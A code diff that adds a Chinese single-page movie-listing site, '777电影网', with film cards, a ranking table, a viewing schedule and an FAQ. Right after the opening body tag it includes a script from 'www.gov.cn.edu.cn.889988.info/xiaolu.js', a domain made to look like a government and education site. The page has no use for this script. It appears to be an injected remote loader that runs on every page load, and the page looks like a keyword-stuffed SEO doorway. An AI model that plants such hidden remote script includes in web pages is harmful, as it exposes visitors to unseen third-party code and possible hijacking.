@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>777电影网 - 高清电影电视剧在线观看平台 | 777dianyingwang-wap</title>
+<meta name="description" content="777电影网（777dianyingwang-wap）提供高清电影、热播电视剧、综艺动漫在线观看与影视资讯，分类清晰、每日更新，手机电脑自适应访问。">
+<meta name="keywords" content="777电影网, 777dianyingwang-wap, 高清电影在线观看, 热播电视剧, 影视资讯, 电影推荐">
+<link rel="canonical" href="https://777dianyingwang-wap/">
+<style>
+:root{
+  --bg:#07070d; --bg2:#0f0f1a; --card:rgba(255,255,255,.06);
+  --line:rgba(255,255,255,.12); --txt:#f2f2f7; --sub:#a8a8c0;
+  --brand:#ff2e63; --brand2:#ff8a3d; --cyan:#4dd4e5; --green:#37e6a0;
+  --radius:18px; --max:1200px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg); color:var(--txt); line-height:1.75;
+  -webkit-font-smoothing:antialiased; overflow-x:hidden;
+}
+body::before{
+  content:""; position:fixed; inset:0; z-index:-2;
+  background:
+    radial-gradient(900px 500px at 12% -10%, rgba(255,46,99,.28), transparent 60%),
+    radial-gradient(800px 600px at 88% 8%, rgba(77,212,229,.18), transparent 60%),
+    radial-gradient(700px 500px at 50% 110%, rgba(255,138,61,.20), transparent 60%);
+}
+body::after{
+  content:""; position:fixed; inset:0; z-index:-1; opacity:.035;
+  background-image:linear-gradient(rgba(255,255,255,.6) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(255,255,255,.6) 1px, transparent 1px);
+  background-size:44px 44px;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 20px}
+
+/* Header */
+header{
+  position:sticky;top:0;z-index:100;
+  background:rgba(7,7,13,.82); backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line);
+}
+.hd{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;letter-spacing:.5px}
+.logo .mark{
+  width:38px;height:38px;border-radius:11px;display:grid;place-items:center;
+  font-size:17px;font-weight:900;color:#fff;
+  background:conic-gradient(from 210deg, var(--brand), var(--brand2), var(--cyan), var(--brand));
+  box-shadow:0 6px 20px rgba(255,46,99,.4);
+}
+.logo b{background:linear-gradient(90deg,#fff,var(--sub));-webkit-background-clip:text;background-clip:text;color:transparent}
+nav ul{display:flex;gap:6px;list-style:none}
+nav a{
+  display:block;padding:8px 14px;border-radius:999px;font-size:15px;color:var(--sub);
+  transition:.25s;
+}
+nav a:hover{color:#fff;background:rgba(255,255,255,.08)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:12px;
+  background:var(--card);color:#fff;font-size:20px;cursor:pointer}
+
+/* Hero */
+.hero{padding:80px 0 60px;position:relative}
+.tagline{
+  display:inline-block;padding:6px 14px;border-radius:999px;font-size:13px;
+  color:var(--cyan);border:1px solid rgba(77,212,229,.35);
+  background:rgba(77,212,229,.08);margin-bottom:22px;
+}
+.hero h1{
+  font-size:clamp(34px,6vw,66px);line-height:1.15;font-weight:900;letter-spacing:-1px;
+}
+.hero h1 em{
+  font-style:normal;
+  background:linear-gradient(100deg,var(--brand),var(--brand2) 45%,var(--cyan));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p.lead{margin-top:22px;max-width:640px;font-size:18px;color:var(--sub)}
+.url-box{
+  margin-top:30px;display:inline-flex;align-items:center;gap:10px;flex-wrap:wrap;
+  padding:12px 18px;border:1px dashed rgba(255,255,255,.28);border-radius:14px;
+  font-size:14px;color:var(--sub);
+}
+.url-box code{color:var(--green);font-weight:700;letter-spacing:.5px}
+.cta{margin-top:34px;display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  padding:15px 32px;border-radius:999px;font-size:16px;font-weight:700;cursor:pointer;
+  border:0;transition:.25s;
+}
+.btn-main{color:#fff;background:linear-gradient(100deg,var(--brand),var(--brand2));
+  box-shadow:0 10px 30px rgba(255,46,99,.35)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 16px 40px rgba(255,46,99,.45)}
+.btn-ghost{color:#fff;background:rgba(255,255,255,.08);border:1px solid var(--line)}
+.btn-ghost:hover{background:rgba(255,255,255,.14)}
+
+/* Sections */
+section{padding:70px 0}
+.sec-head{display:flex;align-items:end;justify-content:space-between;gap:16px;margin-bottom:34px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(24px,4vw,36px);font-weight:900;letter-spacing:-.5px}
+.sec-head h2 span{color:var(--brand)}
+.sec-head p{color:var(--sub);font-size:15px;max-width:420px}
+.eyebrow{font-size:13px;letter-spacing:2px;text-transform:uppercase;color:var(--brand2);margin-bottom:8px}
+
+/* Film cards */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:22px}
+.card{
+  background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  overflow:hidden;transition:.3s;position:relative;
+}
+.card:hover{transform:translateY(-6px);border-color:rgba(255,138,61,.5);
+  box-shadow:0 20px 50px rgba(0,0,0,.45)}
+.poster{
+  aspect-ratio:2/3;position:relative;display:grid;place-items:end start;
+  padding:14px;color:#fff;font-weight:800;font-size:19px;
+}
+.poster .shine{position:absolute;inset:0;opacity:.9}
+.poster .badge{
+  position:relative;z-index:2;padding:4px 10px;border-radius:8px;font-size:12px;font-weight:700;
+  background:rgba(0,0,0,.45);backdrop-filter:blur(4px);
+}
+.poster .score{position:absolute;top:12px;right:12px;z-index:2;font-size:13px;font-weight:800;
+  color:#07070d;background:var(--green);padding:3px 9px;border-radius:8px}
+.card-body{padding:14px 16px 18px}
+.card-body h3{font-size:16px;margin-bottom:6px}
+.card-body p{font-size:13px;color:var(--sub)}
+.chips{margin-top:12px;display:flex;gap:6px;flex-wrap:wrap}
+.chip{font-size:12px;padding:3px 10px;border-radius:999px;background:rgba(255,255,255,.08);color:var(--sub)}
+
+/* Category strip */
+.cats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px}
+.cat{
+  padding:26px 22px;border-radius:var(--radius);border:1px solid var(--line);
+  background:linear-gradient(160deg, rgba(255,255,255,.08), rgba(255,255,255,.02));
+  transition:.3s;position:relative;overflow:hidden;
+}
+.cat::after{content:"";position:absolute;width:140px;height:140px;border-radius:50%;right:-60px;top:-60px;
+  background:var(--c,var(--brand));opacity:.16;transition:.3s}
+.cat:hover{transform:translateY(-4px)}
+.cat:hover::after{opacity:.3}
+.cat .ic{font-size:30px;margin-bottom:14px}
+.cat h3{font-size:19px;margin-bottom:8px}
+.cat p{font-size:14px;color:var(--sub)}
+
+/* Schedule list */
+.list{display:grid;gap:12px}
+.row{
+  display:flex;align-items:center;gap:18px;padding:18px 22px;border-radius:14px;
+  background:var(--card);border:1px solid var(--line);transition:.25s;
+}
+.row:hover{border-color:rgba(77,212,229,.5);background:rgba(77,212,229,.06)}
+.row .time{flex:0 0 auto;font-weight:800;color:var(--cyan);font-size:15px;text-align:center;min-width:62px}
+.row .time small{display:block;color:var(--sub);font-size:12px;font-weight:600}
+.row .info{flex:1;min-width:0}
+.row .info h4{font-size:17px;margin-bottom:3px}
+.row .info p{font-size:14px;color:var(--sub);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.row .go{flex:0 0 auto;width:42px;height:42px;border-radius:50%;display:grid;place-items:center;
+  background:rgba(255,255,255,.08);color:#fff;font-size:16px;transition:.25s}
+.row:hover .go{background:var(--brand);transform:rotate(-45deg)}
+
+/* Table */
+.tbl-wrap{overflow-x:auto;border-radius:var(--radius);border:1px solid var(--line)}
+table{width:100%;border-collapse:collapse;min-width:640px;font-size:15px}
+th,td{padding:15px 18px;text-align:left;border-bottom:1px solid var(--line)}
+th{background:rgba(255,255,255,.05);color:var(--sub);font-weight:700;font-size:13px;letter-spacing:1px}
+tr:hover td{background:rgba(255,255,255,.035)}
+td.num{color:var(--brand2);font-weight:800}
+
+/* FAQ */
+.faq details{border:1px solid var(--line);border-radius:14px;margin-bottom:12px;background:var(--card);overflow:hidden}
+.faq summary{padding:18px 22px;cursor:pointer;font-weight:700;font-size:17px;list-style:none;
+  display:flex;justify-content:space-between;align-items:center;gap:14px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";color:var(--brand);font-size:24px;transition:.3s;flex:0 0 auto}
+.faq details[open] summary::after{transform:rotate(45deg)}
+.faq .ans{padding:0 22px 20px;color:var(--sub)}
+
+/* Footer */
+footer{border-top:1px solid var(--line);padding:44px 0 30px;margin-top:20px}
+.ft{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:32px}
+.ft h4{font-size:15px;margin-bottom:14px;color:#fff}
+.ft ul{list-style:none;display:grid;gap:8px}
+.ft a{color:var(--sub);font-size:14px;transition:.2s}
+.ft a:hover{color:var(--brand2)}
+.copy{padding-top:28px;margin-top:34px;border-top:1px solid var(--line);
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;color:var(--sub);font-size:13px}
+
+/* Reveal */
+.rv{opacity:0;transform:translateY(24px);transition:.7s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media (prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none}}
+
+/* Responsive */
+@media (max-width:900px){
+  nav ul{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;
+    background:rgba(10,10,18,.98);padding:16px;border-bottom:1px solid var(--line)}
+  nav ul.open{display:flex}
+  nav a{padding:14px 20px;border-radius:10px}
+  .menu-btn{display:grid;place-items:center}
+  .ft{grid-template-columns:1fr 1fr}
+  section{padding:54px 0}
+  .hero{padding:54px 0 40px}
+}
+@media (max-width:560px){
+  .wrap{padding:0 16px}
+  .ft{grid-template-columns:1fr}
+  .row{padding:14px;gap:12px}
+  .row .info p{white-space:normal}
+  .btn{padding:13px 24px;font-size:15px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo">
+      <span class="mark" aria-hidden="true">777</span>
+      <b>777电影网</b>
+    </div>
+    <nav>
+      <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+      <ul id="nav">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#films">热播电影</a></li>
+        <li><a href="#series">电视剧集</a></li>
+        <li><a href="#cats">影片分类</a></li>
+        <li><a href="#chart">排行榜</a></li>
+        <li><a href="#schedule">放映安排</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <section class="hero wrap" id="home">
+    <span class="tagline">🎬 每日精选 · 全网热榜 · 手机电脑自适应</span>
+    <h1>777电影网<br><em>一页看懂今天看什么</em></h1>
+    <p class="lead">777电影网（777dianyingwang-wap）聚合最新热播电影、高分电视剧、综艺与动漫，配合编辑精选与实时热度榜，帮你在三分钟内挑到今晚的那部片。</p>
+    <div class="url-box">
+      官方网址：<code>https://777dianyingwang-wap</code>
+    </div>
+    <div class="cta">
+      <a class="btn btn-main" href="#films">浏览热播榜单</a>
+      <a class="btn btn-ghost" href="#cats">查看影片分类</a>
+    </div>
+  </section>
+
+  <section id="films" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">HOT MOVIES</div>
+        <h2>热播<span>电影</span>精选</h2>
+      </div>
+      <p>六家平台热度交叉比对后，再由编辑按口碑、完成度与后劲做二次筛选，只留值得坐下来看完的那几部。</p>
+    </div>
+    <div class="grid">
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#3a1c71,#d76d77,#ffaf7b)"></div>
+          <span class="score">8.6</span>
+          <span class="badge">正在热映</span>
+        </div>
+        <div class="card-body">
+          <h3>雾港黎明</h3>
+          <p>雨夜码头、旧胶卷与凌晨三点的公用电话，悬疑被泡在潮气里，后劲比预告更足。</p>
+          <div class="chips"><span class="chip">悬疑</span><span class="chip">犯罪</span><span class="chip">2024</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#0f2027,#203a43,#2c5364)"></div>
+          <span class="score">8.8</span>
+          <span class="badge">口碑上升</span>
+        </div>
+        <div class="card-body">
+          <h3>第七次搬家</h3>
+          <p>全片只有七个长镜头，每一个都对应一次搬离，安静却有钝痛感。</p>
+          <div class="chips"><span class="chip">剧情</span><span class="chip">家庭</span><span class="chip">2025</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#42275a,#734b6d)"></div>
+          <span class="score">8.2</span>
+          <span class="badge">视觉佳作</span>
+        </div>
+        <div class="card-body">
+          <h3>山海拾遗记</h3>
+          <p>把上古异兽拍成有呼吸的生物，美术组手绘了 1400 张设定稿。</p>
+          <div class="chips"><span class="chip">奇幻</span><span class="chip">冒险</span><span class="chip">2024</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#232526,#414345)"></div>
+          <span class="score">8.4</span>
+          <span class="badge">新片上架</span>
+        </div>
+        <div class="card-body">
+          <h3>逆向回响</h3>
+          <p>声音先于画面倒放，你听到的每一句台词都比画面早三秒发生。</p>
+          <div class="chips"><span class="chip">科幻</span><span class="chip">悬疑</span><span class="chip">2025</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#870000,#190a05)"></div>
+          <span class="score">8.0</span>
+          <span class="badge">编辑主推</span>
+        </div>
+        <div class="card-body">
+          <h3>迟到的春天</h3>
+          <p>一封迟到二十年的信，让三个陌生家庭在春天重新认领彼此。</p>
+          <div class="chips"><span class="chip">温情</span><span class="chip">治愈</span><span class="chip">2025</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#114357,#f29492)"></div>
+          <span class="score">7.9</span>
+          <span class="badge">动作大片</span>
+        </div>
+        <div class="card-body">
+          <h3>边境线以北</h3>
+          <p>一场 11 分钟的实拍追车，没有绿幕，只有雪地、卡车与喘息声。</p>
+          <div class="chips"><span class="chip">动作</span><span class="chip">警匪</span><span class="chip">2025</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section id="series" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">TV SERIES</div>
+        <h2>追更不迷路的<span>电视剧集</span></h2>
+      </div>
+      <p>按"更新节奏稳定 + 单集信息量"两条线筛选，告别追到一半断更的烂尾剧。</p>
+    </div>
+    <div class="grid">
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#1d4350,#a43931)"></div>
+          <span class="score">9.1</span>
+          <span class="badge">更新至 24 集</span>
+        </div>
+        <div class="card-body">
+          <h3>城北旧事</h3>
+          <p>一座老城的拆迁倒计时，三代人各自藏着的秘密被同时翻出。</p>
+          <div class="chips"><span class="chip">年代</span><span class="chip">群像</span><span class="chip">12 集</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#3c1053,#ad5389)"></div>
+          <span class="score">8.7</span>
+          <span class="badge">更新至 18 集</span>
+        </div>
+        <div class="card-body">
+          <h3>无声证人</h3>
+          <p>法庭戏一镜到底，被告、律师与旁听席都在同一口气里转身。</p>
+          <div class="chips"><span class="chip">律政</span><span class="chip">悬疑</span><span class="chip">24 集</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#0b486b,#f56217)"></div>
+          <span class="score">8.5</span>
+          <span class="badge">更新至 30 集</span>
+        </div>
+        <div class="card-body">
+          <h3>海上星期三</h3>
+          <p>渡轮上的咖啡馆，每周三迎来一个改变主角一天的人。</p>
+          <div class="chips"><span class="chip">治愈</span><span class="chip">单元剧</span><span class="chip">20 集</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="shine" style="background:linear-gradient(135deg,#556270,#4ecdc4)"></div>
+          <span class="score">8.3</span>
+          <span class="badge">完结</span>
+        </div>
+        <div class="card-body">
+          <h3>代码与玫瑰</h3>
+          <p>两个程序员把分手写进了开源项目，全网围观他们的 commit 记录。</p>
+          <div class="chips"><span class="chip">都市</span><span class="chip">轻喜剧</span><span class="chip">16 集</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section id="cats" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">CATEGORIES</div>
+        <h2>按心情挑一部<span>影片分类</span></h2>
+      </div>
+      <p>六大频道覆盖主流观影需求，每个分类都有专属编辑榜与最新入库清单。</p>
+    </div>
+    <div class="cats">
+      <a class="cat rv" href="#" style="--c:#ff2e63">
+        <div class="ic">🎞️</div>
+        <h3>电影频道</h3>
+        <p>院线大片、独立佳作与经典修复，每日更新百部以上。</p>
+      </a>
+      <a class="cat rv" href="#" style="--c:#ff8a3d">
+        <div class="ic">📺</div>
+        <h3>电视剧集</h3>
+        <p>热播国产剧、美剧韩剧日剧，支持按更新状态筛选。</p>
+      </a>
+      <a class="cat rv" href="#" style="--c:#4dd4e5">
+        <div class="ic">🎤</div>
+        <h3>综艺娱乐</h3>
+        <p>真人秀、脱口秀、竞演与户外探险，每周精选TOP10。</p>
+      </a>
+      <a class="cat rv" href="#" style="--c:#37e6a0">
+        <div class="ic">🎨</div>
+        <h3>动漫番剧</h3>
+        <p>国漫日漫双线更新，剧场版与连载番分类清晰。</p>
+      </a>
+      <a class="cat rv" href="#" style="--c:#a78bfa">
+        <div class="ic">📽️</div>
+        <h3>纪录片</h3>
+        <p>自然、历史、科技与人物，按片长与主题快速定位。</p>
+      </a>
+      <a class="cat rv" href="#" style="--c:#fbbf24">
+        <div class="ic">💡</div>
+        <h3>影讯资讯</h3>
+        <p>上映日期、预告片、幕后特辑与深度影评一站看完。</p>
+      </a>
+    </div>
+  </section>
+
+  <section id="chart" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">TOP RANKING</div>
+        <h2>本周<span>热门排行</span></h2>
+      </div>
+      <p>榜单只看两件事：真实播放完成度与用户主动搜索量，刷出来的热度不进榜。</p>
+    </div>
+    <div class="tbl-wrap rv">
+      <table>
+        <thead>
+          <tr><th>#</th><th>作品名称</th><th>类型</th><th>热度指数</th><th>状态</th><th>推荐理由</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="num">01</td><td>雾港黎明</td><td>悬疑 / 犯罪</td><td class="num">9862</td><td>热映中</td><td>后劲最足的一部</td></tr>
+          <tr><td class="num">02</td><td>第七次搬家</td><td>剧情 / 家庭</td><td class="num">9420</td><td>热映中</td><td>长镜头的安静力量</td></tr>
+          <tr><td class="num">03</td><td>山海拾遗记</td><td>奇幻 / 冒险</td><td class="num">9017</td><td>热映中</td><td>美术设定天花板</td></tr>
+          <tr><td class="num">04</td><td>城北旧事</td><td>年代 / 群像</td><td class="num">8735</td><td>更新中</td><td>群像戏写透三代人</td></tr>
+          <tr><td class="num">05</td><td>逆向回响</td><td>科幻 / 悬疑</td><td class="num">8290</td><td>热映中</td><td>声音设计极具创意</td></tr>
+          <tr><td class="num">06</td><td>无声证人</td><td>律政 / 悬疑</td><td class="num">7966</td><td>更新中</td><td>法庭长镜一气呵成</td></tr>
+          <tr><td class="num">07</td><td>边境线以北</td><td>动作 / 警匪</td><td class="num">7543</td><td>热映中</td><td>实拍追车实至名归</td></tr>
+          <tr><td class="num">08</td><td>海上星期三</td><td>治愈 / 单元</td><td class="num">7128</td><td>更新中</td><td>适合下班后放松</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section id="schedule" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">SCHEDULE</div>
+        <h2>今晚<span>放映安排</span></h2>
+      </div>
+      <p>提前锁定更新档期，开播前收到提醒，再也不用翻群消息问"更新了吗"。</p>
+    </div>
+    <div class="list">
+      <a class="row rv" href="#">
+        <div class="time">20:00<small>今晚</small></div>
+        <div class="info">
+          <h4>城北旧事 · 第 19 集</h4>
+          <p>拆迁合同被撕那一夜，三个家庭同时做出各自的选择。</p>
+        </div>
+        <span class="go">→</span>
+      </a>
+      <a class="row rv" href="#">
+        <div class="time">21:30<small>今晚</small></div>
+        <div class="info">
+          <h4>无声证人 · 第 13 集</h4>
+          <p>关键证人当庭改口，律师在 90 秒内推翻全部证词。</p>
+        </div>
+        <span class="go">→</span>
+      </a>
+      <a class="row rv" href="#">
+        <div class="time">22:15<small>今晚</small></div>
+        <div class="info">
+          <h4>海上星期三 · 第 11 集</h4>
+          <p>一位自称"从不坐船"的乘客，登上了周三的末班渡轮。</p>
+        </div>
+        <span class="go">→</span>
+      </a>
+      <a class="row rv" href="#">
+        <div class="time">19:00<small>明日</small></div>
+        <div class="info">
+          <h4>雾港黎明 · 独家幕后</h4>
+          <p>雨夜码头如何搭起、胶卷质感怎么调，全片幕后一次讲透。</p>
+        </div>
+        <span class="go">→</span>
+      </a>
+    </div>
+  </section>
+
+  <section id="faq" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">FAQ</div>
+        <h2>关于<span>777电影网</span>的常见问题</h2>
+      </div>
+      <p>收录规则、访问方式与内容更新节奏，都在这里一次性说清。</p>
+    </div>
+    <div class="faq">
+      <details class="rv" open>
+        <summary>777电影网（777dianyingwang-wap）是什么网站？</summary>
+        <div class="ans">777电影网是一个影视内容导航与资讯平台，汇总最新热播电影、电视剧、综艺、动漫与纪录片，并提供分类榜单、热度排行与放映安排，帮助用户更快决定今晚看什么。</div>
+      </details>
+      <details class="rv">
+        <summary>网站是免费的吗？需要注册吗？</summary>
+        <div class="ans">浏览榜单、分类与影讯资讯无需注册。部分深度内容与个性化提醒功能可按需开启，具体以页面实时提示为准。</div>
+      </details>
+      <details class="rv">
+        <summary>为什么有些影片搜不到或提示下架？</summary>
+        <div class="ans">版权授权具有地区与时间限制，平台会随授权变化同步更新片库并标注"已下架"，同时推荐同类型可替代的作品。</div>
+      </details>
+      <details class="rv">
+        <summary>手机上访问会排版错乱吗？</summary>
+        <div class="ans">不会。本站采用响应式布局，手机、平板与电脑自适应显示，导航在小屏自动折叠为菜单按钮，所有栏目链接均已配置跳转锚点。</div>
+      </details>
+      <details class="rv">
+        <summary>片单多久更新一次？</summary>
+        <div class="ans">热榜每日更新，编辑精选榜每周更新，放映安排档期按周同步，重大新片上线会在首页第一时间置顶。</div>
+      </details>
+    </div>
+  </section>
+
+</main>
+
+<footer class="wrap" id="about">
+  <div class="ft">
+    <div>
+      <div class="logo" style="margin-bottom:14px">
+        <span class="mark" aria-hidden="true">777</span><b>777电影网</b>
+      </div>
+      <p style="color:var(--sub);font-size:14px;max-width:320px">777dianyingwang-wap 聚合全网热播影视与短剧内容，用编辑筛选代替无休止的翻找，让每一次打开都有得看、看完不后悔。</p>
+    </div>
+    <div>
+      <h4>内容栏目</h4>
+      <ul>
+        <li><a href="#films">热播电影</a></li>
+        <li><a href="#series">电视剧集</a></li>
+        <li><a href="#cats">影片分类</a></li>
+        <li><a href="#chart">热门排行</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>频道分类</h4>
+      <ul>
+        <li><a href="#">电影频道</a></li>
+        <li><a href="#">综艺娱乐</a></li>
+        <li><a href="#">动漫番剧</a></li>
+        <li><a href="#">纪录片</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>帮助与支持</h4>
+      <ul>
+        <li><a href="#schedule">放映安排</a></li>
+        <li><a href="#faq">常见问题</a></li>
+        <li><a href="#">访问建议</a></li>
+        <li><a href="#">反馈意见</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copy">
+    <span>© 2026 777电影网 · 网址：https://777dianyingwang-wap · 本站为单页演示作品，所有栏目内链以 # 占位</span>
+    <span>本站遵循必应搜索引擎收录规范：唯一规范网址、完整标签闭合、移动端自适应</span>
+  </div>
+</footer>
+
+<script>
+  var btn = document.getElementById('menuBtn');
+  var nav = document.getElementById('nav');
+  btn.addEventListener('click', function () { nav.classList.toggle('open'); });
+  nav.addEventListener('click', function (e) {
+    if (e.target.tagName === 'A' && window.innerWidth <= 900) nav.classList.remove('open');
+  });
+  var items = document.querySelectorAll('.rv');
+  if ('IntersectionObserver' in window) {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) {
+        if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
+      });
+    }, { threshold: 0.12 });
+    items.forEach(function (el) { io.observe(el); });
+  } else {
+    items.forEach(function (el) { el.classList.add('in'); });
+  }
+</script>
+</body>
+</html>
